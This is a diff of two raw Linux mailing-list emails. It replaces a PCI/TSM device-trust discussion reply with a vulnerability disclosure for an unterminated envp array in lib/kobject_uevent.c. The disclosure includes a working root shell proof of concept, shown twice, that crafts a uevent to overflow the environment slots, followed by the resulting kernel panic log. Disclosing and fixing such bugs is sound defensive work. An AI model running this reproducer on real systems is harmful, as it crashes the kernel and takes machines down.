@@ -1,67 +1,98 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.216.51
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1795435088;
-	b=FlQwOHRh6GAI5G2pdDD9D7QocSVaafHkH/XsJkDn1PtElyMkZfAz1bLs+iA+eoKWAd6N
-	 2XcHe9hgp2xiRzTtl8fK9sbSnz3xsjGWHieThwRh4GeCocEZBnKwXqFcoBHv5NUu07CIB
-	 XTnlLbC5wOYgZBPvL00i/Z1yF0TEb8fx9YmxZwKFSF/GTocSQahcCSDw1liFmOeZ1VqjP
-	 eQu9TG4ghCyl6pwbbdoRz4tD7W4qjUHkgXAw5LYWXmb7CgwaNBBE0bqrqkpU6kZU21FFS
-	 fhLNARTWsi0e6jSMLAnVq3WJwBCe4uCgleV4eNfQIB8vYnsDHLP7iC3IOr0XWRAecVg==
+	t=1795436205;
+	b=O4t2QOZ/34KwkBVkeE6VxwLXExs4jymkYhTR1khmKsCFUPClG/FMXQ/2WpXluw7LbcRx
+	 cWextL3Puz0x3pawQh9Eo/XDvtXlM1jPvk/Ktfvfd82WJx0YraQs+9QbU60T6szwA8W2E
+	 9r7nT5USvxi8w1R6vsvPGh9ZBPfESM00WovUKZ1T0JvkV7pzlRAUD6qb5sQWTDmLp5xwT
+	 yxwzcKxQMRpRMjN4/hVybKtsRShADl5DTaxPFPz0GZTVfOxynt/7iZOzBahx85KvYWBoz
+	 mdxd2Bk6mAoJLFla5yMdFtGDhsQxe/oCc4UgxU8BtdiOwUIKtATQQvqU/Xwh2cZx3aA==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1795435088;
-	h=Received:DKIM-Signature:Date:From:To:Cc:Subject:Message-ID:
-	 References:MIME-Version:Content-Type:Content-Disposition:In-Reply-To;
-	bh=0TmBe1tXlcWpfCVrfd1KqqoznT5l5Jx1iU5TZr+SAgw=;
-	b=hTZKecc1gtevVLiSXQoVsKHWKeZnSB+WS1vor/ZQ36UPTcGhm+XQGFeZaeKzQD6TTvqw
-	 GFiHWUhaScbiRSiJ1ByGDL61nhnERH+V6glyCaFM9mQKzukqVxF2JrmqG0hXlN/G8e7Or
-	 rsfd1ZChixV7MlQWboZGzxynuCj/9eekfEe4Qq3W4PitAEj9eDXY+8oD5CG3rbUU4NEXH
-	 zjbeud6kxUV+f1Q4ErdUn7DpvwXKuHy1FPiZ+ggQOr18w4BGOs1b0NSiq/hKOHsahLjYX
-	 7QCn1AlO/8DbJZLeLWmyZryDPzTpFVlPrjJ/ZinAfi0gaZcCwkjgYPJs9LKFRsM6Jaw==
+	a=rsa-sha256; c=relaxed/relaxed; t=1795436205;
+	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
+	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
+	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
+	 Content-Transfer-Encoding;
+	bh=VkE7Vjq+Mj2kI9OgXXiloalWcp8Wq6iPLh1LkUcmpFg=;
+	b=NT9eNpZW0qUwRUM89Us3p5P/27LaN8fbVKd5l73Ij/m4FixFBR9wFErQ14K3GVivcA0D
+	 B0EmcuYUweFGzOBWO+zk9zALNHd76bAn2I77B8zt6GUFT+q3wQTHd0+pd0LXijQpcvrc/
+	 I2Z+n0QsZ0s5dI6iFOgMmsLHyaeLCIbT1r0cN7mL1NEzymW8DcxcEbkffCKBc0BD/4kcq
+	 iQTwD/taoebMAX/NEy5h7i50MOhFCBCuVGdq1vbdGPI+tlUZhZd/Ndwm/WPjm80zBt4i+
+	 iDRqY2TSkkJoY41VwYrIFwjtWLxQFAtaWhKHHIHCeyxvvCRiPpXOKvVp7TdP39RWE1Q==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dkim=pass header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b="Du1Kyd/P";
-	arc=none smtp.remote-ip=100.103.45.18
-Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature ECDSA (prime256v1))
+	dmarc=pass header.from=nebusec.ai;
+	spf=pass smtp.mailfrom=nebusec.ai;
+	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=eUffSFdI;
+	arc=none smtp.remote-ip=209.85.216.51
+Received: from mail-pj1-f51.google.com (mail-pj1-f51.google.com [209.85.216.51])
+	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D0EB5606A31E;
-	Mon, 23 Nov 2026 11:58:08 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 21C6A606A31E
+	for <driver-core@lists.linux.dev>; Mon, 23 Nov 2026 12:16:45 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 21C6A606A31E
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=Du1Kyd/P
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 98C5A1F000C4;
-	Mon, 23 Nov 2026 11:58:07 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1795435088;
-	bh=0TmBe1tXlcWpfCVrfd1KqqoznT5l5Jx1iU5TZr+SAgw=;
-	h=Date:From:To:Cc:Subject:References:In-Reply-To;
-	b=Du1Kyd/P8Lt8CAlnCV7czApRJxSEjYBL842wCUV0K57v809kCt9syFf0KB08w77MM
-	 JujsWwgrqh7lztdFxkWRgR4X3WQmsCsj5/8FFfoeif8cO/de/Whfz74lZZCwQ8R6UW
-	 8NJHIwr/RI+Fmc/6yn5zCmCebhKDshF6qsqaP0jfF1oRjGYll/8c3EvfDv3dzSVYj+
-	 dDpJrLtmJkj5SnWHMzQ5EhjhM2UNnM2mtqOPQnVlG/BrW0+x94gc9vI5q2USFGxw5R
-	 cl/r6ieFsaF4x+9d24X2yRBTgGfDQsxUumN0rmfCjpqZvFzIZ07Y9Xr11v4JuwFvi2
-	 MBF1PVHTKOhjA==
-Date: Mon, 23 Nov 2026 13:58:03 +0200
-From: Leon Romanovsky <leon@kernel.org>
-To: "Aneesh Kumar K.V" <aneesh.kumar@kernel.org>
-Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-	linux-coco@lists.linux.dev, Dan Williams <djbw@kernel.org>,
-	Bjorn Helgaas <bhelgaas@google.com>, Jason Gunthorpe <jgg@ziepe.ca>,
-	Jonathan Cameron <jonathan.cameron@huawei.com>,
-	Xu Yilun <yilun.xu@linux.intel.com>,
-	Alexey Kardashevskiy <aik@amd.com>,
-	"Rafael J . Wysocki" <rafael@kernel.org>,
-	Steven Price <steven.price@arm.com>,
-	Suzuki K Poulose <suzuki.poulose@arm.com>,
-	Lukas Wunner <lukas@wunner.de>, Ashish Kalra <ashish.kalra@amd.com>,
-	Tom Lendacky <thomas.lendacky@amd.com>,
-	Herbert Xu <herbert@gondor.apana.org.au>,
-	driver-core@lists.linux.dev, linux-pci@vger.kernel.org,
-	kvm@vger.kernel.org, patches@lists.linux.dev
-Subject: Re: [PATCH v1 00/10] PCI/TSM: Support guest TSM drivers
-Message-ID: <20261123115803.GN14811@unreal>
-References: <20261123083337.2731019-1-aneesh.kumar@kernel.org>
- <2026112325-emit-squeezing-5d96@gregkh>
- <20261123090623.GK14811@unreal>
- <yq5a7bi3riha.fsf@kernel.org>
+	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=eUffSFdI
+Received: by mail-pj1-f51.google.com with SMTP id 98e67ed59e1d1-3b3d4d3bba3so1574850a91.3
+        for <driver-core@lists.linux.dev>; Mon, 23 Nov 2026 04:16:44 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1795436204; x=1796041004; darn=lists.linux.dev;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=VkE7Vjq+Mj2kI9OgXXiloalWcp8Wq6iPLh1LkUcmpFg=;
+        b=eUffSFdIafwgVuetZis0YmBu4oOQQ/ltGYlEqEnweIRJEa5HtPgbZKLffRrsiONq7O
+         tm9NWE3ojjhrig0LsF8TEk7jL1x9Mb/IyY5vZYPebAjcjAktn7rAMhQNQ4zWESwt6BxH
+         hXD0pepBEVbntPYvykhUVbwoABbdfj/omQWACNojI0J6r96eB0XU9ZkPQ2KPGp7J9tMB
+         rccA+O3yHlkELnXnO02b1d20bLZb8z8Qy6nEaoOsX3Ypyp2K8OjntqBg9HLxsvkSUkw7
+         3diHK+aAry0sj8Q9mz1Unthrrn1yoVfx6ZIfrdT0l07i3icyUhIVV104HR+8X2x63i/W
+         xUZA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1795436204; x=1796041004;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=VkE7Vjq+Mj2kI9OgXXiloalWcp8Wq6iPLh1LkUcmpFg=;
+        b=PZ/8z9nAQ0bWuj2fA7awdlngR8mBpU3ph1mnv7edZ5PjkkkPP89s5rSqmW++P2Nv+H
+         qRUDPpaAEnm8M8lWx4WF/H/2muTXEI6ekBU8SIDQHwA2pYq6yzxd4PxicuO5EDfy9LCi
+         /qN2PaHXjKqcr62Xxz1c/sr8JZL8nj5hpJFgtISOCTjoHQ0zjyfPL6wr06AlS8rBLL7x
+         o7+yP/33OI89XJQ8RoBc+RCpQiYWnoOhZ9JOGLV91or2pFqJQv145Wv+GIvp7RpHHsod
+         hyTikiL+MlA8YMPyKbKhzilCW/7mHwT66bnKTGFUll/IvUQvajGVGdWtS8FarTZ/pjda
+         VZEg==
+X-Forwarded-Encrypted: i=1; AL+hErGALBvGybUM453fDLxbKz35VshTyqs1KG4Ta3Gxf+NJVH/NTL+VkYSobszbiKe2q9WYh968+G0nklQvVg==@lists.linux.dev
+X-Gm-Message-State: APuU4Z/Mm/qZ/quS4iGauqTt5PNXuaA6FKBe0OnrVtB3XsxNgMd19jlt
+	2ECYoNObAU4Rvz5grh84o6cs9E+xeIXeEjdzFYHyPVph2qcRtHu46C+L2/tglrlSEYws
+X-Gm-Gg: AZFdTZeGCWZRwv1fGpVCtshKT3qu5xuNWkGm8Tzt2c5se/U/1ZJy5DNeYwVvYTBDrg9
+	TAPai0n9/UEbIjSxdFB6XiXuho5SmsHZ6oY5Sj3tuRP11c1O8gDOQX/EIcH49c/Qx4BjBhau1ym
+	kdT6nfcefR00TDfd+l4h89zcCbrDsf+5G78da+ZhOMQkqYvAVlY7mFJnNunIny/N2QguF91WQ2d
+	pGldXfplV2p/cniNsnoRXkE8ZrIe2nxIILDOdXLX2V89G/Qk3x9QV6naWvP9SaVokvuZuWSkIld
+	VTRcGFlSdfLcnI6v7s0d6bdcEG+OMAoJIHlAwqqlk+NelzMR7arxISkuVn55oRn3nDMLCQZYaV0
+	8kC629BSsTPTKa+o3i66kuK16vxr5yd9JxH1XH7LBcslUJyFQt9fE/d5zbzWMc+e8x0E9X3iF2L
+	fTyiLYfw8/56AnFJ/ohGqbTJML3U1V1YU+jt4YpqzuIuElFg0xJ4dXx5uT7GVvIq8UnAOdsIyRU
+	LkL8OUFC6ElbM1EYmlZjqvTUgkK2oUx2fp9QPTTuckg2uzLnTj1n88LRnM+e89KJa7GIKfuF0jM
+	GmUhTzfVEEmXRxKDh0T7TFfRCclAboab7/gcOwAC
+X-Received: by 2002:a17:90b:2fcd:b0:3ad:b8c8:4a84 with SMTP id 98e67ed59e1d1-3b41c925e29mr10077702a91.26.1795436204098;
+        Mon, 23 Nov 2026 04:16:44 -0800 (PST)
+Received: from enjou-Legion-Y7000P-2019 ([191.223.218.36])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3b40578dca0sm21112338a91.2.2026.11.23.04.16.40
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 23 Nov 2026 04:16:43 -0800 (PST)
+From: Ren Wei <weir@nebusec.ai>
+To: linux-kernel@vger.kernel.org,
+	driver-core@lists.linux.dev
+Cc: gregkh@linuxfoundation.org,
+	rafael@kernel.org,
+	dakr@kernel.org,
+	johan@kernel.org,
+	akpm@linux-foundation.org,
+	kay.sievers@vrfy.org,
+	vega@nebusec.ai,
+	caoruide123@gmail.com,
+	weir@nebusec.ai
+Subject: [PATCH driver-core 0/1] kobject: reserve an envp slot for the terminator
+Date: Mon, 23 Nov 2026 20:16:36 +0800
+Message-ID: <cover.1795426787.git.caoruide123@gmail.com>
+X-Mailer: git-send-email 2.53.0
 X-Mailing-List: driver-core@lists.linux.dev
 List-Id: <driver-core.lists.linux.dev>
 List-Post: <mailto:driver-core@lists.linux.dev>
@@ -71,92 +102,147 @@ List-Unsubscribe: <mailto:driver-core+unsubscribe@lists.linux.dev>
 List-Owner: <mailto:driver-core+owner@lists.linux.dev>
 Precedence: list
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <yq5a7bi3riha.fsf@kernel.org>
+Content-Transfer-Encoding: 8bit
 
-On Mon, Nov 23, 2026 at 03:13:13PM +0530, Aneesh Kumar K.V wrote:
-> Leon Romanovsky <leon@kernel.org> writes:
-> 
-> > On Mon, Nov 23, 2026 at 09:40:55AM +0100, Greg Kroah-Hartman wrote:
-> >> On Mon, Nov 23, 2026 at 02:03:27PM +0530, Aneesh Kumar K.V (Arm) wrote:
-> >> > This series adds the PCI/TSM support needed by a TEE Security Manager
-> >> > (TSM) driver in a confidential guest. It adds device lock/unlock,
-> >> > helpers for recording device acceptance and parsing MMIO reports, and
-> >> > DMA callbacks used during PCI driver attachment. The guest TSM driver and
-> >> > attestation commands using these interfaces are in follow-up series.
-> >> > 
-> >> > This series is based on Dan Williams' "[PATCH v2 00/19] PCI/TSM: TEE I/O
-> >> > infrastructure" posting [1], particularly the guest LOCK/UNLOCK, ACCEPT
-> >> > and MMIO report work [2-4]. It retains device_cc_accepted() and the
-> >> > confidential-device acceptance model from that posting, with changes
-> >> > adapted to the current PCI/TSM structures and reference APIs. Dan's
-> >> > device-core acceptance helper and per-host-bridge IDE stream reporting
-> >> > patch are also included.
-> >> > 
-> >> > This series does not adopt the Device Trust changes from Dan's "Device
-> >> > Evidence and Trust for PCI Security Protocol (TDISP)" [5]. That work is
-> >> > being developed separately in Leon Romanovsky's "driver core: Authorize
-> >> > device trust before driver binding" series, [6]. Confidential-device
-> >> > acceptance is kept separate from that driver-binding trust policy.
-> >> 
-> >> But it should not, as you are making driver core changes that will
-> >> mirror the same thing that that patchset is attempting to do.  Please
-> >> work together on this.
-> >
-> > +10000000,
-> >
-> > Greg,
-> >
-> > This series came as a surprise to me given the fact that device trust
-> > series is exactly for that - allow confidential computing.
-> >
-> > Adversarial is equal to the "cc_accepted".
-> 
-> I think the confusion stems from this thread:
-> 
-> https://lore.kernel.org/all/yq5amrr8yldi.fsf@kernel.org
-> 
-> Based on that discussion, I understood TRUST and eligibility for private
-> DMA to be complementary attributes. Device acceptance determines whether
-> a device may access private memory, while trust determines whether the
-> core must enforce additional restrictions. I understood that supporting
-> an accepted but adversarial device would require either a private IOTLB
-> to restrict its access or an IOMMU.
+From: Ruide Cao <caoruide123@gmail.com>
 
-I reached a completely different conclusion from that discussion.
+Hi Linux kernel maintainers,
 
-Device trust does little beyond preventing driver binding and recording the
-trust decision in "struct device". The missing piece, which I would expect
-you to address, is ensuring that the IOMMU and private DMA are configured
-only after the trust level has been decided or as part of that decision,
-rather than beforehand, as they are today.
+We found an issue in lib/kobject_uevent.c.
 
-Thanks
+This bug is tracked at: https://bugtracker.nebusec.ai/f/16082
 
-> 
-> Therefore, with this series, a request to enable private memory DMA is
-> handled as follows:
-> 
-> 	if (!device_cc_accepted(&pdev->dev)) {
-> 		ret = -EACCES;
-> 		goto out;
-> 	}
-> 
-> 	/* Adversarial devices are unsupported for confidential DMA. */
-> 	if (device_is_adversarial(&pdev->dev)) {
-> 		ret = -EOPNOTSUPP;
-> 		goto out;
-> 	}
+add_uevent_var() permits envp_idx to reach ARRAY_SIZE(env->envp), filling
+the final pointer slot without reserving a trailing NULL. With
+CONFIG_UEVENT_HELPER and a nonempty helper path, an event containing
+exactly 61 variables before SEQNUM causes SEQNUM, HOME, and PATH to fill
+all 64 slots. call_usermodehelper then asynchronously passes this
+unterminated array to kernel_execve(). count_strings_kernel() reads beyond
+envp into envp_idx and env->buf, interprets those bytes as pointers, and
+later dereferences invalid addresses while copying the environment.
+Synthetic arguments allow the environment count to be tuned, resulting in
+an out-of-bounds scan and kernel crash.
 
-The snippet above clearly shows why it is a good idea to wait until support
-for device trust levels is accepted. An adversarial device is untrusted
-from the PCI perspective and must have private DMA and a separate IOMMU
-group.
+Privilege model: writing a synthetic uevent to /sys/module/kernel/uevent
+and setting /proc/sys/kernel/hotplug require CAP_SYS_ADMIN; the
+reproducer runs as root. The crash also depends on CONFIG_UEVENT_HELPER
+and a nonempty helper path.
 
-Thanks
+Compatibility: no uAPI change.
 
-> 
-> 
-> -aneesh
-> 
+Reproducer:
+
+#!/bin/sh
+set -eu
+
+# This PoC must run as root inside the guest.
+printf '%s' /bin/true > /proc/sys/kernel/hotplug
+echo 0 > /proc/sys/kernel/panic_on_warn
+
+msg='add 11111111-1111-1111-1111-111111111111'
+i=1
+while [ "$i" -le 57 ]; do
+	msg="$msg K$i=V$i"
+	i=$((i + 1))
+done
+
+printf '%s\n' "$msg" > /sys/module/kernel/uevent
+sleep 2
+
+
+
+We run the PoC in a 2 GB RAM x86 QEMU environment.
+
+------BEGIN PoC------
+
+#!/bin/sh
+set -eu
+
+# This PoC must run as root inside the guest.
+printf '%s' /bin/true > /proc/sys/kernel/hotplug
+echo 0 > /proc/sys/kernel/panic_on_warn
+
+msg='add 11111111-1111-1111-1111-111111111111'
+i=1
+while [ "$i" -le 57 ]; do
+	msg="$msg K$i=V$i"
+	i=$((i + 1))
+done
+
+printf '%s\n' "$msg" > /sys/module/kernel/uevent
+sleep 2
+
+
+------END PoC--------
+
+----BEGIN crash log----
+
+[  161.975900][ T1043] BUG: unable to handle page fault for address: 0000000000656c75
+[  161.977567][ T1043] #PF: supervisor read access in kernel mode
+[  161.978836][ T1043] #PF: error_code(0x0000) - not-present page
+[  161.979824][ T1043] PGD 0 P4D 0
+[  161.980319][ T1043] Oops: Oops: 0000 [#1] SMP KASAN NOPTI
+[  161.981257][ T1043] CPU: 0 UID: 0 PID: 1043 Comm: kworker/u16:0 Not tainted 6.12.95 #4 53deed68f5e8c87eac9412ec2ca16e6c37d9fe62
+[  161.983040][ T1043] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  161.985205][ T1043] RIP: 0010:strnlen+0x1b/0x40
+[  161.986083][ T1043] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 48 8d 14 37 48 89 f8 48 85 f6 75 0b eb 21 48 83 c0 01 48 39 c2 74 0d <80> 38 00 75 f2 48 29 f8 e9 c3 bd 36 00 48 89 d0 48 29 f8 e9 b8 bd
+[  161.989083][ T1043] RSP: 0018:ffffc90003127e30 EFLAGS: 00010206
+[  161.990058][ T1043] RAX: 0000000000656c75 RBX: ffff88810df296a8 RCX: ffffffff81f0516d
+[  161.991261][ T1043] RDX: 0000000000676c75 RSI: 0000000000020000 RDI: 0000000000656c75
+[  161.992481][ T1043] RBP: ffff888110090040 R08: 0000000000000001 R09: fffff9400006ea00
+[  161.993709][ T1043] R10: ffffea00003751f7 R11: 0000000000000001 R12: 0000000000656c75
+[  161.994995][ T1043] R13: ffff888117b20200 R14: ffff88810df29010 R15: dffffc0000000000
+[  161.996234][ T1043] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
+[  161.997606][ T1043] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  161.998664][ T1043] CR2: 0000000000656c75 CR3: 0000000008534002 CR4: 0000000000770ef0
+[  161.999992][ T1043] PKRU: 55555554
+[  162.000517][ T1043] Call Trace:
+[  162.001100][ T1043]  <TASK>
+[  162.001523][ T1043]  copy_string_kernel+0x27/0x440
+[  162.002422][ T1043]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  162.003347][ T1043]  ? __asan_memcpy+0x3c/0x60
+[  162.004120][ T1043]  copy_strings_kernel+0x92/0x130
+[  162.004951][ T1043]  kernel_execve+0x201/0x2e0
+[  162.005615][ T1043]  call_usermodehelper_exec_async+0x21f/0x440
+[  162.006658][ T1043]  ? trace_hardirqs_on+0x5b/0x110
+[  162.007530][ T1043]  ? __pfx_call_usermodehelper_exec_async+0x10/0x10
+[  162.008499][ T1043]  ret_from_fork+0x31/0x70
+[  162.009271][ T1043]  ? __pfx_call_usermodehelper_exec_async+0x10/0x10
+[  162.010331][ T1043]  ret_from_fork_asm+0x1a/0x30
+[  162.011099][ T1043]  </TASK>
+[  162.011639][ T1043] Modules linked in:
+[  162.012264][ T1043] CR2: 0000000000656c75
+[  162.012984][ T1043] ---[ end trace 0000000000000000 ]---
+[  162.013800][ T1043] RIP: 0010:strnlen+0x1b/0x40
+[  162.014558][ T1043] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 48 8d 14 37 48 89 f8 48 85 f6 75 0b eb 21 48 83 c0 01 48 39 c2 74 0d <80> 38 00 75 f2 48 29 f8 e9 c3 bd 36 00 48 89 d0 48 29 f8 e9 b8 bd
+[  162.017573][ T1043] RSP: 0018:ffffc90003127e30 EFLAGS: 00010206
+[  162.018548][ T1043] RAX: 0000000000656c75 RBX: ffff88810df296a8 RCX: ffffffff81f0516d
+[  162.019831][ T1043] RDX: 0000000000676c75 RSI: 0000000000020000 RDI: 0000000000656c75
+[  162.021036][ T1043] RBP: ffff888110090040 R08: 0000000000000001 R09: fffff9400006ea00
+[  162.022264][ T1043] R10: ffffea00003751f7 R11: 0000000000000001 R12: 0000000000656c75
+[  162.023449][ T1043] R13: ffff888117b20200 R14: ffff88810df29010 R15: dffffc0000000000
+[  162.024845][ T1043] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
+[  162.026300][ T1043] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  162.027378][ T1043] CR2: 0000000000656c75 CR3: 0000000008534002 CR4: 0000000000770ef0
+[  162.028229][ T1043] PKRU: 55555554
+[  162.028615][ T1043] Kernel panic - not syncing: Fatal exception
+[  162.029525][ T1043] Kernel Offset: disabled
+[  162.030001][ T1043] Rebooting in 10 seconds..
+
+
+-----END crash log-----
+
+Best regards,
+Ruide Cao
+
+Ruide Cao (1):
+  kobject: reserve an envp slot for the terminator
+
+ lib/kobject_uevent.c | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+
+
+base-commit: b6a9fa34ce4187cb69d3c588a4bbffc31ce5db8f
+-- 
+2.47.3
+
